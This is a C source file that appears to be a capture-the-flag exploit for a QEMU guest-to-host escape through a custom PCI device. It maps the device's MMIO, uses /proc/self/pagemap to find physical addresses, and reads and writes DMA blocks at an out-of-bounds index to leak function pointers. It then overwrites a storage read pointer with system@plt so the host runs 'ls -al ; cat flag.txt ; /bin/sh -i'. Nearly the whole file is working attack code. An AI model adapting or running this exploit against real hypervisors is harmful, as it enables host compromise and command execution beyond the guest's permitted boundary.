#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/mman.h>
#include <fcntl.h>

// https://xz.aliyun.com/t/6562


// https://gist.github.com/ccbrown/9722406
void dumphex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}



#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

int pagemap_fd;
uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}


volatile unsigned char* mmio_mem;
void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}


__attribute__((aligned(4096))) char global_buf[4096];
uint64_t global_buf_pa;

void write_block(int index, const char *buf) {
	memcpy(global_buf, buf, 4096);
	mmio_write(0x18, 1);    // command: to noraml
	while (mmio_read(0x10) != 1);    // wait to normal
	mmio_write(0x18, 2);    // command: wait dma args
	while (mmio_read(0x10) != 3);    // wait to normal
	mmio_write(0x20, index);
	mmio_write(0x28, global_buf_pa);
	mmio_write(0x18, 0x13);    // command: dma to device, cpu write, device read

	while (mmio_read(0x10) != 0x14);

	mmio_write(0x18, 1);
}

void read_block(int index, char *buf) {
	memset(global_buf, 0, 4096);
	mmio_write(0x18, 1);    // command: to noraml
	//while (mmio_read(0x10) != 1);    // wait to normal
	mmio_write(0x18, 2);    // command: wait dma args
	//while (mmio_read(0x10) != 3);    // wait to normal
	mmio_write(0x20, index);
	mmio_write(0x28, global_buf_pa);
	mmio_write(0x18, 0x23);    // command: dma from device, cpu read, device write

	while (mmio_read(0x10) != 0x14);

	memcpy(buf, global_buf, 4096);

	mmio_write(0x18, 1);
}

// -------------------------------------

#define FEISTEL_K 16
#define ROL64(x, n) (((x) << (n)) | ((x) >> (64 - (n))))

static void storage_internal_encrypt(void *dst, const void *src, unsigned int len) {
        unsigned int i;
        unsigned int j;
        unsigned long long left;
        unsigned long long right;
        unsigned long long oldright;
        for (i = 0; i < len / 16; i++) {
                memcpy(&left, ((const unsigned char *)src)+16*i, 8);    // memory may be unaligned
                memcpy(&right, ((const unsigned char *)src)+16*i+8, 8);
                for (j = 0; j < FEISTEL_K; j++) {    // feistel
                        oldright = right;
                        right = left ^ ROL64(right ^ 0x73706f3073706f30, 7);
                        left = oldright;
                }
                memcpy(((unsigned char *)dst)+16*i, &right, 8);
                memcpy(((unsigned char *)dst)+16*i+8, &left, 8);
        }
}

static void storage_internal_decrypt(void *dst, const void *src, unsigned int len) {
        unsigned int i;
        unsigned int j;
        unsigned long long left;
        unsigned long long right;
        unsigned long long oldright;
        for (i = 0; i < len / 16; i++) {
                memcpy(&left, ((const unsigned char *)src)+16*i, 8);    // memory may be unaligned
                memcpy(&right, ((const unsigned char *)src)+16*i+8, 8);
                for (j = 0; j < FEISTEL_K; j++) {    // feistel
                        oldright = right;
                        right = left ^ ROL64(right ^ 0x73706f3073706f30, 7);
                        left = oldright;
                }
                memcpy(((unsigned char *)dst)+16*i, &right, 8);
                memcpy(((unsigned char *)dst)+16*i+8, &left, 8);
        }
}

// -------------------------------------

int main(void) {
	pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
	if (pagemap_fd < 0) {
		perror("open");
		exit(1);
	}

	// find the correct device resource0 filename
	char resource0filename[] = "/sys/devices/pci0000:00/0000:00:0?.0/resource0";
	for (int i = 0; i < 10; i++) {
		char deviceidfilename[] = "/sys/devices/pci0000:00/0000:00:0?.0/device";
		deviceidfilename[33] = '0'+i;
		int tmpfd = open(deviceidfilename, O_RDONLY);
		if (tmpfd < 0) {
			break;
		}
		char buf[6];
		read(tmpfd, buf, 6);
		if (memcmp(buf, "0x7373", 6) == 0) {
			resource0filename[33] = '0'+i;
			break;
		}
	}

	printf("%s\n", resource0filename);
	int mmio_fd = open(resource0filename, O_RDWR | O_SYNC);
	if (mmio_fd == -1) {
		printf("mmio_fd open failed\n");
	}

	mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
	if (mmio_mem == MAP_FAILED) {
		printf("mmap mmio_mem failed\n");
	}

	global_buf[0] = 0;
	global_buf_pa = gva_to_gpa(global_buf);
	printf("global_buf_pa: %lx\n", global_buf_pa);

	printf("magic: %lx\n", mmio_read(0));

	// store command at the head of BackendStorage
	//char command[4096] = "kill -9 $PPID ; ls -al ; cat flag.txt ; /bin/sh\0";
	char command[4096] = "ls -al ; cat flag.txt ; /bin/sh -i\0";
	storage_internal_decrypt(command, command, 4096);
	write_block(0, command);

	// leak three the func pointers in BackendStorage
	char b[4096] = {0};
	read_block(256, b);
	storage_internal_decrypt(b, b, 4096);

	dumphex(b, 32);

	unsigned long *bb = (unsigned long *)b;
	
	unsigned long system_plt = 0x2b9300;    // FIXME: need to change
	unsigned long ss_storage_read = 0x4f08e0;    // FIXME: need to change

	// change (*read_func) to system@plt
	bb[1] -= ss_storage_read - system_plt;
	storage_internal_encrypt(b, b, 4096);
	write_block(256, b);

	// trigger system(command)
	read_block(256, b);

	return 0;
}

